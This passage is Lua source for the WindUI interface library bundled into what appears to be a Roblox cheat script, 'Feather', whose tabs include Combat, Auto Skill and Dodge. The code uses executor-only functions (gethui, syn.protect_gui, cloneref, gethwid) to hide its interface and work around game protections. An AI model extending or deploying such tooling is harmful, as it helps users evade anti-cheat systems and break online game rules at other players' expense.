Scale=1,
}),
},
true
)

local N=ao("Frame",{
Size=aw.Topbar.ButtonsType~="Default"and UDim2.new(0,24,0,24)
or UDim2.new(0,aw.Topbar.Height-16,0,aw.Topbar.Height-16),
BackgroundTransparency=1,
Parent=aw.UIElements.Main.Main.Topbar.Right,
LayoutOrder=F or 999,
},{
M,
})



aw.TopBarButtons[100-F]={
Name=A,
Object=N,
}

an.AddSignal(M.MouseButton1Click,function()
if C then
C()
end
end)
an.AddSignal(M.MouseEnter,function()
if aw.Topbar.ButtonsType=="Default"then
ap(M,0.15,{ImageTransparency=0.93}):Play()


else

ap(
L.ImageLabel,
0.1,
{ImageTransparency=0},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
ap(L,0.1,{
Size=UDim2.new(
0,
J or aw.TopBarButtonIconSize,
0,
J or aw.TopBarButtonIconSize
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
end)

an.AddSignal(M.MouseButton1Down,function()
ap(M.UIScale,0.2,{Scale=0.9},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end)

an.AddSignal(M.MouseLeave,function()
if aw.Topbar.ButtonsType=="Default"then
ap(M,0.1,{ImageTransparency=1}):Play()


else

ap(
L.ImageLabel,
0.1,
{ImageTransparency=1},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
ap(
L,
0.1,
{Size=UDim2.new(0,0,0,0)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
end
end)

an.AddSignal(M.InputEnded,function()
ap(M.UIScale,0.2,{Scale=1},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut):Play()
end)

return M
end

function aw.Topbar.Button(z,A:{
Name:string,
Icon:string,
Callback:any,
LayoutOrder:number,
IconThemed:boolean,
Color:Color3,
IconSize:number,
})
return aw:CreateTopbarButton(
A.Name,
A.Icon,
A.Callback,
A.LayoutOrder or 0,
A.IconThemed,
A.Color,
A.IconSize
)
end



local z=an.Drag(
aw.UIElements.Main,
{aw.UIElements.Main.Main.Topbar,r.Frame},
function(z,A)
if not aw.Closed then
if z and A==r.Frame then
ap(r,0.1,{ImageTransparency=0.35}):Play()
else
ap(r,0.2,{ImageTransparency=0.8}):Play()
end
aw.Position=aw.UIElements.Main.Position
aw.Dragging=z
end
end
)

if not h and aw.Background and typeof(aw.Background)=="table"then
local A=ao"UIGradient"
for B,C in next,aw.Background do
A[B]=C
end

aw.UIElements.BackgroundGradient=an.NewRoundFrame(aw.UICorner,"Squircle",{
Size=UDim2.new(1,0,1,0),
Parent=aw.UIElements.Main.Background,
ImageTransparency=aw.Transparent and av.WindUI.TransparencyValue or 0,
},{
A,
})
end














aw.OpenButtonMain=a.load'A'.New(aw)

task.spawn(function()
if aw.Icon then
local A=ao("Frame",{
Size=UDim2.new(0,22,0,22),
BackgroundTransparency=1,
Parent=aw.UIElements.Main.Main.Topbar.Left,
})

v=an.Image(
aw.Icon,
aw.Title,
aw.IconRadius,
aw.Folder,
"Window",
true,
aw.IconThemed,
"WindowTopbarIcon"
)
v.Parent=A
v.Size=UDim2.new(0,aw.IconSize,0,aw.IconSize)
v.Position=UDim2.new(0.5,0,0.5,0)
v.AnchorPoint=Vector2.new(0.5,0.5)

aw.OpenButtonMain:SetIcon(aw.Icon)











else
aw.OpenButtonMain:SetIcon(aw.Icon)

end
end)

function aw.SetToggleKey(A,B)
aw.ToggleKey=B
end

function aw.SetTitle(A,B)
aw.Title=B
x.Text=B
end

function aw.SetAuthor(A,B)
aw.Author=B
if not u then
u=createAuthor(aw.Author)
end

u.Text=B
end

function aw.SetSize(A,B)
if typeof(B)=="UDim2"then
aw.Size=B

ap(aw.UIElements.Main,0.08,{Size=B},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
end

function aw.SetBackgroundImage(A,B)
aw.UIElements.Main.Background.ImageLabel.Image=B
end
function aw.SetBackgroundImageTransparency(A,B)
if i and i:IsA"ImageLabel"then
i.ImageTransparency=math.floor(B*10+0.5)/10
end
aw.BackgroundImageTransparency=math.floor(B*10+0.5)/10
end

function aw.SetBackgroundTransparency(A,B)
local C=math.floor(tonumber(B)*10+0.5)/10
av.WindUI.TransparencyValue=C
aw:ToggleTransparency(C>0)
end

local A
local B
an.Icon"minimize"
an.Icon"maximize"

aw:CreateTopbarButton(
"Fullscreen",
aw.Topbar.ButtonsType=="Mac"and"rbxassetid://127426072704909"or"maximize",
function()
aw:ToggleFullscreen()
end,
(aw.Topbar.ButtonsType=="Default"and 998 or 999),
true,
Color3.fromHex"#60C762",
aw.Topbar.ButtonsType=="Mac"and 9 or nil
)

local function SetSize(C)
ap(aw.UIElements.Main,0.45,{
Size=not aw.IsFullscreen and B or UDim2.new(
0,
(av.WindUI.ScreenGui.AbsoluteSize.X-20)/av.WindUI.UIScale,
0,
(av.WindUI.ScreenGui.AbsoluteSize.Y-20-52)/av.WindUI.UIScale
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()

ap(
aw.UIElements.Main,
0.45,
{Position=not aw.IsFullscreen and A or UDim2.new(0.5,0,0.5,26)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
end

function aw.ToggleFullscreen(C)
local F=aw.IsFullscreen

z:Set(F)

if not F then
A=aw.UIElements.Main.Position
B=aw.UIElements.Main.Size

aw.CanResize=false
else
if aw.Resizable then
aw.CanResize=true
end
end

aw.IsFullscreen=not F

SetSize(true)
end

an.AddSignal(av.WindUI.ScreenGui:GetPropertyChangedSignal"AbsoluteSize",function()
if aw.IsFullscreen then
SetSize()
end
end)

aw:CreateTopbarButton("Minimize","minus",function()
if aw.Close then
aw:Close()
end






















end,(aw.Topbar.ButtonsType=="Default"and 997 or 998),nil,Color3.fromHex"#F4C948")

function aw.OnOpen(C,F)
aw.OnOpenCallback=F
end
function aw.OnClose(C,F)
aw.OnCloseCallback=F
end
function aw.OnDestroy(C,F)
aw.OnDestroyCallback=F
end

if av.WindUI.UseAcrylic then
aw.AcrylicPaint.AddParent(aw.UIElements.Main)
end

function aw.SetIconSize(C,F)
local G
if typeof(F)=="number"then
G=UDim2.new(0,F,0,F)
aw.IconSize=F
elseif typeof(F)=="UDim2"then
G=F
aw.IconSize=F.X.Offset
end

if v then
v.Size=G
end
end

function aw.Open(C)
if aw.Destroyed then
return
end
task.spawn(function()
if aw.OnOpenCallback then
task.spawn(function()
an.SafeCallback(aw.OnOpenCallback)
end)
end

task.wait(0.06)
aw.Closed=false

aw.UIElements.Main.Size=UDim2.new(aw.Size.X.Scale,aw.Size.X.Offset,0,100)

ap(aw.UIElements.Main,0.8,{

Size=aw.Size,
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()

if aw.UIElements.BackgroundGradient then
ap(aw.UIElements.BackgroundGradient,0.2,{
ImageTransparency=0,
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end

aw.UIElements.Main.Background.ImageTransparency=1
ap(aw.UIElements.Main.Background,0.4,{

ImageTransparency=aw.Transparent and av.WindUI.TransparencyValue or 0,
},Enum.EasingStyle.Exponential,Enum.EasingDirection.Out):Play()

if i then
if i:IsA"VideoFrame"then
i.Visible=true
else
ap(i,0.2,{
ImageTransparency=aw.BackgroundImageTransparency,
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
end

if aw.OpenButtonMain and aw.IsOpenButtonEnabled then
aw.OpenButtonMain:Visible(false)
end









ap(
b,
0.25,
{ImageTransparency=aw.ShadowTransparency},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()




ap(
r,
0.45,
{Size=UDim2.new(0,aw.DragFrameSize,0,4),ImageTransparency=0.8},
Enum.EasingStyle.Exponential,
Enum.EasingDirection.Out
):Play()
z:Set(true)

if aw.Resizable then
ap(
az.ImageLabel,
0.45,
{ImageTransparency=0.8},
Enum.EasingStyle.Exponential,
Enum.EasingDirection.Out
):Play()
aw.CanResize=true
end

aw.CanDropdown=true
aw.UIElements.Main.Visible=true



aw.UIElements.Main:WaitForChild"Main".Visible=true

av.WindUI:ToggleAcrylic(true)

end)
end
function aw.Close(C)
if aw.Destroyed then
return
end

local F={}

if aw.OnCloseCallback then
task.spawn(function()
an.SafeCallback(aw.OnCloseCallback)
end)
end

av.WindUI:ToggleAcrylic(false)

if aw.UIElements.Main and aw.UIElements.Main:WaitForChild"Main"then
aw.UIElements.Main.Main.Visible=false
end

aw.CanDropdown=false
aw.Closed=true

ap(aw.UIElements.Main,0.9,{

Size=UDim2.new(aw.Size.X.Scale,aw.Size.X.Offset,0,0),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
if aw.UIElements.BackgroundGradient then
ap(aw.UIElements.BackgroundGradient,0.2,{
ImageTransparency=1,
},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut):Play()
end

ap(aw.UIElements.Main.Background,0.3,{

ImageTransparency=1,
},Enum.EasingStyle.Exponential,Enum.EasingDirection.InOut):Play()








if i then
if i:IsA"VideoFrame"then
i.Visible=false
else
ap(i,0.3,{
ImageTransparency=1,
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
end
ap(b,0.25,{ImageTransparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()




ap(
r,
0.3,
{Size=UDim2.new(0,0,0,4),ImageTransparency=1},
Enum.EasingStyle.Exponential,
Enum.EasingDirection.InOut
):Play()
ap(
az.ImageLabel,
0.3,
{ImageTransparency=1},
Enum.EasingStyle.Exponential,
Enum.EasingDirection.Out
):Play()
z:Set(false)
aw.CanResize=false

task.spawn(function()
task.wait(0.4)

if not aw.Closed then
return
end

aw.UIElements.Main.Visible=false

if aw.OpenButtonMain and not aw.Destroyed and not aw.IsPC and aw.IsOpenButtonEnabled then
aw.OpenButtonMain:Visible(true)
end
end)

function F.Destroy(G)
task.spawn(function()
if aw.OnDestroyCallback then
task.spawn(function()
an.SafeCallback(aw.OnDestroyCallback)
end)
end

if aw.AcrylicPaint and aw.AcrylicPaint.Model then
aw.AcrylicPaint.Model:Destroy()
end

aw.Destroyed=true

task.wait(0.4)

av.WindUI.ScreenGui:Destroy()
av.WindUI.NotificationGui:Destroy()
av.WindUI.DropdownGui:Destroy()
av.WindUI.TooltipGui:Destroy()

an.DisconnectAll()

return
end)
end

return F
end
function aw.Destroy(C)
return aw:Close():Destroy()
end
function aw.Toggle(C)
if aw.Closed then
aw:Open()
else
aw:Close()
end
end

function aw.ToggleTransparency(C,F)

aw.Transparent=F
av.WindUI.Transparent=F

aw.UIElements.Main.Background.ImageTransparency=F and av.WindUI.TransparencyValue or 0


end

function aw.LockAll(C)
for F,G in next,aw.AllElements do
if G.Lock then
G:Lock()
end
end
end
function aw.UnlockAll(C)
for F,G in next,aw.AllElements do
if G.Unlock then
G:Unlock()
end
end
end
function aw.GetLocked(C)
local F={}

for G,H in next,aw.AllElements do
if H.Locked then
table.insert(F,H)
end
end

return F
end
function aw.GetUnlocked(C)
local F={}

for G,H in next,aw.AllElements do
if H.Locked==false then
table.insert(F,H)
end
end

return F
end

function aw.GetUIScale(C,F)
return av.WindUI.UIScale
end

function aw.SetUIScale(C,F)
av.WindUI.UIScale=F
ap(av.WindUI.UIScaleObj,0.2,{Scale=F},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
return aw
end

function aw.SetToTheCenter(C)
ap(
aw.UIElements.Main,
0.45,
{Position=UDim2.new(0.5,0,0.5,0)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
return aw
end

function aw.SetCurrentConfig(C,F)
aw.CurrentConfig=F
end

do
local C=40
local F=al.ViewportSize
local G=Vector2.new(aw.Size.X.Offset,aw.Size.Y.Offset)

if not aw.IsFullscreen and aw.AutoScale then
local H=F.X-(C*2)
local J=F.Y-(C*2)

local L=H/G.X
local M=J/G.Y

local N=math.min(L,M)

local O=0.3
local P=1.0

local Q=math.clamp(N,O,P)

local R=aw:GetUIScale()or 1
local S=0.05

if math.abs(Q-R)>S then
aw:SetUIScale(Q)
end
end
end

if aw.OpenButtonMain and aw.OpenButtonMain.Button then
an.AddSignal(aw.OpenButtonMain.Button.TextButton.MouseButton1Click,function()


aw:Open()
end)
end

an.AddSignal(af.InputBegan,function(C,F)
if F then
return
end

if aw.ToggleKey then
if C.KeyCode==aw.ToggleKey then
aw:Toggle()
end
end
end)

task.spawn(function()

aw:Open()
end)

function aw.EditOpenButton(C,F)
return aw.OpenButtonMain:Edit(F)
end

if aw.OpenButton and typeof(aw.OpenButton)=="table"then
aw:EditOpenButton(aw.OpenButton)
end

local C=a.load'aa'
local F=a.load'ab'
local G=C.Init(aw,av.WindUI,av.WindUI.TooltipGui)
G:OnChange(function(H)
aw.CurrentTab=H
end)

aw.TabModule=G

function aw.Tab(H,J)
J.Parent=aw.UIElements.SideBar.Frame
return G.New(J,av.WindUI.UIScale)
end

function aw.SelectTab(H,J)
G:SelectTab(J)
end

function aw.Section(H,J)
return F.New(
J,
aw.UIElements.SideBar.Frame,
aw.Folder,
av.WindUI.UIScale,
aw
)
end

function aw.IsResizable(H,J)
aw.Resizable=J
aw.CanResize=J
end

function aw.SetPanelBackground(H,J)
if typeof(J)=="boolean"then
aw.HidePanelBackground=J

aw.UIElements.MainBar.Background.Visible=J

if G then
for L,M in next,G.Containers do
M.ScrollingFrame.UIPadding.PaddingTop=UDim.new(0,aw.HidePanelBackground and 20 or 10)
M.ScrollingFrame.UIPadding.PaddingLeft=
UDim.new(0,aw.HidePanelBackground and 20 or 10)
M.ScrollingFrame.UIPadding.PaddingRight=
UDim.new(0,aw.HidePanelBackground and 20 or 10)
M.ScrollingFrame.UIPadding.PaddingBottom=
UDim.new(0,aw.HidePanelBackground and 20 or 10)
end
end
end
end

function aw.Divider(H)
local J=ao("Frame",{
Size=UDim2.new(1,0,0,1),
Position=UDim2.new(0.5,0,0,0),
AnchorPoint=Vector2.new(0.5,0),
BackgroundTransparency=0.9,
ThemeTag={
BackgroundColor3="Text",
},
})
local L=ao("Frame",{
Parent=aw.UIElements.SideBar.Frame,

Size=UDim2.new(1,-7,0,5),
BackgroundTransparency=1,
},{
J,
})

return L
end

local H=a.load'o'
function aw.Dialog(J,L)
local M={
Title=L.Title or"Dialog",
Width=L.Width or 320,
Content=L.Content,
Buttons=L.Buttons or{},

TextPadding=14,
}
local N=H.Create(false,"Dialog",aw,av.WindUI,aw.UIElements.Main.Main)

N.UIElements.Main.Size=UDim2.new(0,M.Width,0,0)

local O=ao("Frame",{
Size=UDim2.new(1,0,1,0),
AutomaticSize="Y",
BackgroundTransparency=1,
Parent=N.UIElements.Main,
},{
ao("UIListLayout",{
FillDirection="Vertical",

Padding=UDim.new(0,N.UIPadding),
}),
})

local P=ao("Frame",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
BackgroundTransparency=1,
Parent=O,
},{
ao("UIListLayout",{
FillDirection="Horizontal",
Padding=UDim.new(0,N.UIPadding),
VerticalAlignment="Center",
}),
ao("UIPadding",{
PaddingTop=UDim.new(0,M.TextPadding/2),
PaddingLeft=UDim.new(0,M.TextPadding/2),
PaddingRight=UDim.new(0,M.TextPadding/2),
}),
})

local Q
if L.Icon then
Q=an.Image(
L.Icon,
M.Title..":"..L.Icon,
0,
aw,
"Dialog",
true,
L.IconThemed
)
Q.Size=UDim2.new(0,22,0,22)
Q.Parent=P
end

N.UIElements.UIListLayout=ao("UIListLayout",{
Padding=UDim.new(0,12),
FillDirection="Vertical",
HorizontalAlignment="Left",
VerticalFlex="SpaceBetween",
Parent=N.UIElements.Main,
})

ao("UISizeConstraint",{
MinSize=Vector2.new(180,20),
MaxSize=Vector2.new(400,math.huge),
Parent=N.UIElements.Main,
})

N.UIElements.Title=ao("TextLabel",{
Text=M.Title,
TextSize=20,
FontFace=Font.new(an.Font,Enum.FontWeight.SemiBold),
TextXAlignment="Left",
TextWrapped=true,
RichText=true,
Size=UDim2.new(1,Q and-26-N.UIPadding or 0,0,0),
AutomaticSize="Y",
ThemeTag={
TextColor3="Text",
},
BackgroundTransparency=1,
Parent=P,
})
if M.Content then
ao("TextLabel",{
Text=M.Content,
TextSize=18,
TextTransparency=0.4,
TextWrapped=true,
RichText=true,
FontFace=Font.new(an.Font,Enum.FontWeight.Medium),
TextXAlignment="Left",
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
LayoutOrder=2,
ThemeTag={
TextColor3="Text",
},
BackgroundTransparency=1,
Parent=O,
},{
ao("UIPadding",{
PaddingLeft=UDim.new(0,M.TextPadding/2),
PaddingRight=UDim.new(0,M.TextPadding/2),
PaddingBottom=UDim.new(0,M.TextPadding/2),
}),
})
end

local R=ao("UIListLayout",{
Padding=UDim.new(0,6),
FillDirection="Horizontal",
HorizontalAlignment="Center",
HorizontalFlex="Fill",
})

local S=ao("Frame",{
Size=UDim2.new(1,0,0,36),
AutomaticSize="None",
BackgroundTransparency=1,
Parent=N.UIElements.Main,
LayoutOrder=4,
},{
R,






})

local T={}

for U,V in next,M.Buttons do
local W=
ar(V.Title,V.Icon,V.Callback,V.Variant,S,N,true)
table.insert(T,W)
W.Size=UDim2.new(1,0,1,0)
end





















































N:Open()

return N
end

local J=false

aw:CreateTopbarButton("Close","x",function()
if not J then
if not aw.IgnoreAlerts then
J=true

aw:Dialog{

Title="Close Window",
Content="Do you want to close this window? You will not be able to open it again.",
Buttons={
{
Title="Cancel",

Callback=function()
J=false
end,
Variant="Secondary",
},
{
Title="Close Window",

Callback=function()
J=false
aw:Destroy()
end,
Variant="Primary",
},
},
}
else
aw:Destroy()
end
end
end,(aw.Topbar.ButtonsType=="Default"and 999 or 997),nil,Color3.fromHex"#F4695F")

function aw.Tag(L,M)
if aw.UIElements.Main.Main.Topbar.Center.Visible==false then
aw.UIElements.Main.Main.Topbar.Center.Visible=true
end
M.Window=aw
return at:New(M,aw.UIElements.Main.Main.Topbar.Center.Holder)
end

local L=av.WindUI.GenerateGUID()

local function startResizing(M)
if aw.CanResize then
isResizing=true
aA.Active=true
initialSize=aw.UIElements.Main.Size
initialInputPosition=M.Position


ap(az.ImageLabel,0.1,{ImageTransparency=0.35}):Play()

an.AddSignal(M.Changed,function()
if M.UserInputState==Enum.UserInputState.End then
if av.WindUI.CurrentInput and av.WindUI.CurrentInput~=L then
return
end

av.WindUI.CurrentInput=nil

isResizing=false
aA.Active=false


ap(az.ImageLabel,0.17,{ImageTransparency=0.8}):Play()
end
end)
end
end

an.AddSignal(az.InputBegan,function(M)
if
M.UserInputType==Enum.UserInputType.MouseButton1
or M.UserInputType==Enum.UserInputType.Touch
then
if av.WindUI.CurrentInput and av.WindUI.CurrentInput~=L then
return
end
av.WindUI.CurrentInput=L

if aw.CanResize then
startResizing(M)
end
end
end)

an.AddSignal(af.InputChanged,function(M)
if
M.UserInputType==Enum.UserInputType.MouseMovement
or M.UserInputType==Enum.UserInputType.Touch
then
if isResizing and aw.CanResize then
local N=M.Position-initialInputPosition
local O=UDim2.new(0,initialSize.X.Offset+N.X*2,0,initialSize.Y.Offset+N.Y*2)

O=UDim2.new(
O.X.Scale,
math.clamp(O.X.Offset,aw.MinSize.X,aw.MaxSize.X),
O.Y.Scale,
math.clamp(O.Y.Offset,aw.MinSize.Y,aw.MaxSize.Y)
)

ap(aw.UIElements.Main,0.08,{
Size=O,
},Enum.EasingStyle.Quad,Enum.EasingDirection.Out):Play()

aw.Size=O
end
end
end)

an.AddSignal(az.MouseEnter,function()
if av.WindUI.CurrentInput and av.WindUI.CurrentInput~=L then
return
end
if not isResizing then
ap(az.ImageLabel,0.1,{ImageTransparency=0.35}):Play()
end
end)
an.AddSignal(az.MouseLeave,function()
if av.WindUI.CurrentInput and av.WindUI.CurrentInput~=L then
return
end
if not isResizing then
ap(az.ImageLabel,0.17,{ImageTransparency=0.8}):Play()
end
end)



local M=0
local N=0.4
local O
local P=0

function onDoubleClick()
aw:SetToTheCenter()
end

an.AddSignal(r.Frame.MouseButton1Up,function()
local Q=tick()
local R=aw.Position

P=P+1

if P==1 then
M=Q
O=R

task.spawn(function()
task.wait(N)
if P==1 then
P=0
O=nil
end
end)
elseif P==2 then
if Q-M<=N and R==O then
onDoubleClick()
end

P=0
O=nil
M=0
else
P=1
M=Q
O=R
end
end)



if not aw.HideSearchBar then
local Q=a.load'ad'
local R=false





















local S=aq("Search","search",aw.UIElements.SideBarContainer,true)
S.Size=UDim2.new(1,-aw.UIPadding/2,0,39)
S.Position=UDim2.new(0,aw.UIPadding/2,0,0)

an.AddSignal(S.MouseButton1Click,function()
if R then
return
end

Q.new(aw.TabModule,aw.UIElements.Main,function()

R=false
if aw.Resizable then
aw.CanResize=true
end

ap(aB,0.1,{ImageTransparency=1}):Play()
aB.Active=false
end)
ap(aB,0.1,{ImageTransparency=0.65}):Play()
aB.Active=true

R=true
aw.CanResize=false
end)
end



function aw.DisableTopbarButtons(Q,R)
for S,T in next,R do
for U,V in next,aw.TopBarButtons do
if V.Name==T then
V.Object.Visible=false
end
end
end
end



























return aw
end end end

local aa={
Window=nil,
Theme=nil,
Creator=a.load'd',
LocalizationModule=a.load'e',
NotificationModule=a.load'f',
Themes=nil,
Transparent=false,

TransparencyValue=0.15,

UIScale=1,

ConfigManager=nil,
Version="0.0.0",

Services=a.load'k',

OnThemeChangeFunction=nil,

cloneref=nil,
UIScaleObj=nil,

CreateWindow=nil,

CurrentInput=nil,
}

local af=(cloneref or clonereference or function(af)
return af
end)

aa.cloneref=af

local ai=af(game:GetService"HttpService")
local ak=af(game:GetService"Players")
local al=af(game:GetService"CoreGui")
local am=af(game:GetService"RunService")
local an=af(game:GetService"UserInputService")

function aa.GenerateGUID()
return ai:GenerateGUID(false)
end

local ao=aa.GenerateGUID()

an.InputBegan:Connect(function(ap,aq)




task.defer(function()
if
ap.UserInputType==Enum.UserInputType.MouseButton1
or ap.UserInputType==Enum.UserInputType.Touch
then
if aa.CurrentInput and aa.CurrentInput~=ao then
return
end

aa.CurrentInput=ao


end
end)
end)
an.InputEnded:Connect(function(ap,aq)
if ap.UserInputType==Enum.UserInputType.MouseButton1 or ap.UserInputType==Enum.UserInputType.Touch then
if aa.CurrentInput and aa.CurrentInput~=ao then
return
end

aa.CurrentInput=nil
end
end)

local ap=ak.LocalPlayer or nil

local aq=ai:JSONDecode(a.load'l')
if aq then
aa.Version=aq.version
end

local ar=a.load'p'

local as=aa.Creator

local at=as.New




local au=a.load't'

local av=protectgui or(syn and syn.protect_gui)or function()end

local aw=gethui and gethui()or(al or ap:WaitForChild"PlayerGui")

local ax=at("UIScale",{
Scale=aa.UIScale,
})

aa.UIScaleObj=ax

aa.ScreenGui=at("ScreenGui",{
Name="WindUI",
Parent=aw,
IgnoreGuiInset=true,
ScreenInsets="None",
DisplayOrder=-99999,
},{

at("Folder",{
Name="Window",
}),






at("Folder",{
Name="KeySystem",
}),
at("Folder",{
Name="Popups",
}),
at("Folder",{
Name="ToolTips",
}),
})

aa.NotificationGui=at("ScreenGui",{
Name="WindUI/Notifications",
Parent=aw,
IgnoreGuiInset=true,
})
aa.DropdownGui=at("ScreenGui",{
Name="WindUI/Dropdowns",
Parent=aw,
IgnoreGuiInset=true,
})
aa.TooltipGui=at("ScreenGui",{
Name="WindUI/Tooltips",
Parent=aw,
IgnoreGuiInset=true,
})
av(aa.ScreenGui)
av(aa.NotificationGui)
av(aa.DropdownGui)
av(aa.TooltipGui)

as.Init(aa)

function aa.SetParent(ay,az)
if aa.ScreenGui then
aa.ScreenGui.Parent=az
end
if aa.NotificationGui then
aa.NotificationGui.Parent=az
end
if aa.DropdownGui then
aa.DropdownGui.Parent=az
end
if aa.TooltipGui then
aa.TooltipGui.Parent=az
end
end
math.clamp(aa.TransparencyValue,0,1)

local ay=aa.NotificationModule.Init(aa.NotificationGui)

function aa.Notify(az,aA)
aA.Holder=ay.Frame
aA.Window=aa.Window

return aa.NotificationModule.New(aA)
end

function aa.SetNotificationLower(az,aA)
ay.SetLower(aA)
end

function aa.SetFont(az,aA)
as.UpdateFont(aA)
end

function aa.OnThemeChange(az,aA)
aa.OnThemeChangeFunction=aA
end

function aa.AddTheme(az,aA)
aa.Themes[aA.Name]=aA
return aA
end

function aa.SetTheme(az,aA)
if aa.Themes[aA]then
aa.Theme=aa.Themes[aA]
as.SetTheme(aa.Themes[aA])

if aa.OnThemeChangeFunction then
aa.OnThemeChangeFunction(aA)
end

return aa.Themes[aA]
end
return nil
end

function aa.GetThemes(az)
return aa.Themes
end
function aa.GetCurrentTheme(az)
return aa.Theme.Name
end
function aa.GetTransparency(az)
return aa.Transparent or false
end
function aa.GetWindowSize(az)
return aa.Window.UIElements.Main.Size
end
function aa.Localization(az,aA)
return aa.LocalizationModule:New(aA,as)
end

function aa.SetLanguage(az,aA)
if as.Localization then
return as.SetLanguage(aA)
end
return false
end

function aa.ToggleAcrylic(az,aA)
if aa.Window and aa.Window.AcrylicPaint and aa.Window.AcrylicPaint.Model then
aa.Window.Acrylic=aA
aa.Window.AcrylicPaint.Model.Transparency=aA and 0.98 or 1
if aA then
au.Enable()
else
au.Disable()
end
end
end

function aa.Gradient(az,aA,aB)
local b={}
local d={}

for f,g in next,aA do
local h=tonumber(f)
if h then
h=math.clamp(h/100,0,1)

local i=g.Color
if typeof(i)=="string"and string.sub(i,1,1)=="#"then
i=Color3.fromHex(i)
end

local l=g.Transparency or 0

table.insert(b,ColorSequenceKeypoint.new(h,i))
table.insert(d,NumberSequenceKeypoint.new(h,l))
end
end

table.sort(b,function(f,g)
return f.Time<g.Time
end)
table.sort(d,function(f,g)
return f.Time<g.Time
end)

if#b<2 then
table.insert(b,ColorSequenceKeypoint.new(1,b[1].Value))
table.insert(d,NumberSequenceKeypoint.new(1,d[1].Value))
end

local f={
Color=ColorSequence.new(b),
Transparency=NumberSequence.new(d),
}

if aB then
for g,h in pairs(aB)do
f[g]=h
end
end

return f
end

function aa.Popup(az,aA)
aA.WindUI=aa
return a.load'u'.new(aA,aa.ScreenGui.Popups)
end

aa.Themes=a.load'v'(aa,as)

as.Themes=aa.Themes

aa:SetTheme"Dark"
aa:SetLanguage(as.Language)

function aa.CreateWindow(az,aA)
local aB=a.load'ae'

if not am:IsStudio()and writefile then
if not isfolder"WindUI"then
makefolder"WindUI"
end
if aA.Folder then
makefolder(aA.Folder)
else
makefolder(aA.Title)
end
end

aA.WindUI=aa
aA.Window=aa.Window
aA.Parent=aa.ScreenGui.Window

if aa.Window then
warn"You cannot create more than one window"
return
end

local b=true

local d=aa.Themes[aA.Theme or"Dark"]


as.SetTheme(d)

local f=gethwid or function()
return ak.LocalPlayer.UserId
end

local g=f()

if aA.KeySystem then
b=false

local function loadKeysystem()
ar.new(aA,g,function(h)
b=h
end)
end

local h=(aA.Folder or"Temp").."/"..g..".key"

if aA.KeySystem.KeyValidator then
if aA.KeySystem.SaveKey and isfile(h)then
local i=readfile(h)
local l=aA.KeySystem.KeyValidator(i)

if l then
b=true
else
loadKeysystem()
end
else
loadKeysystem()
end
elseif not aA.KeySystem.API then
if aA.KeySystem.SaveKey and isfile(h)then
local i=readfile(h)
local l=(type(aA.KeySystem.Key)=="table")and table.find(aA.KeySystem.Key,i)
or tostring(aA.KeySystem.Key)==tostring(i)

if l then
b=true
else
loadKeysystem()
end
else
loadKeysystem()
end
else
if isfile(h)then
local i=readfile(h)
local l=false

for m,p in next,aA.KeySystem.API do
local r=aa.Services[p.Type]
if r then
local u={}
for v,x in next,r.Args do
table.insert(u,p[x])
end

local v=r.New(table.unpack(u))
local x=v.Verify(i)
if x then
l=true
break
end
end
end

b=l
if not l then
loadKeysystem()
end
else
loadKeysystem()
end
end

repeat
task.wait()
until b
end

local h=aB(aA)

aa.Transparent=aA.Transparent
aa.Window=h

if aA.Acrylic then
au.init()
end













return h
end

return aa
]==========]

-- END BUNDLED WINDUI SOURCE
    end)()
    local make=(function()
-- BEGIN BUNDLED WINDUI
-- Declarative modern UI: construction, value projection, and user actions are separate.
return function(ctx)
    local state=ctx.State
    local api={Controls={},Tabs={},Ready=false,BackgroundReady=false,Visible=true}
    local lifetime={Closed=false,VisibilityApplied=false}
    local wavesTab="Waves Defense"
    local order={"Main","Combat",wavesTab,"Auto Skill","Misc","Player","Utility","Speacial","Dodge","Settings"}
    local icons={"house","swords","shield","sparkles","menu","users","settings","trending-up","shield","sliders-horizontal"}
    local projections={}
    local cadence={Next=0,Choices=0,Cursor=1,Tab=nil,Build=os.clock()}
    local memory=ctx.Memory or {Pruned=0,Update=function()end}
    api.Memory=memory
    local function valid()return not lifetime.Closed and state.Running~=false end
    local function fail(reason)
        state.WindUIError=tostring(reason)
        if ctx.WindUI.Notify then ctx.WindUI:Notify({Title="Feather",Content=state.WindUIError,Duration=5})end
    end
    local function safe(fn)
        return function(...)
            if not valid()then return end
            local ok,reason=pcall(fn,...)
            if not ok then fail(reason)end
        end
    end
    local function action(name,...)
        assert(type(state[name])=="function","Control unavailable: "..name)
        return state[name](...)
    end
    local function constructionPoint()
        assert(valid(),"UI initialization cancelled")
        if ctx.Yield then ctx.Yield()
        elseif ctx.Defer and os.clock()-cadence.Build>=.002 then task.wait();cadence.Build=os.clock()end
        assert(valid(),"UI initialization cancelled")
    end
    local function signature(value,ordered)
        if type(value)~="table"then return tostring(value)end
        local items={};for _,item in ipairs(value)do items[#items+1]=tostring(item)end
        if not ordered then table.sort(items)end
        return table.concat(items,"\0")
    end
    local function mapping(options,label,id,map)
        local base,suffix=label,2
        while map[label]~=nil do label=base.." ("..suffix..")";suffix+=1 end
        options[#options+1]=label;map[label]=id
        return label
    end
    local function chosen(options,map,enabled)
        local result={}
        for _,label in ipairs(options)do if enabled(map[label])then result[#result+1]=label end end
        return result
    end
    local function selection(values)
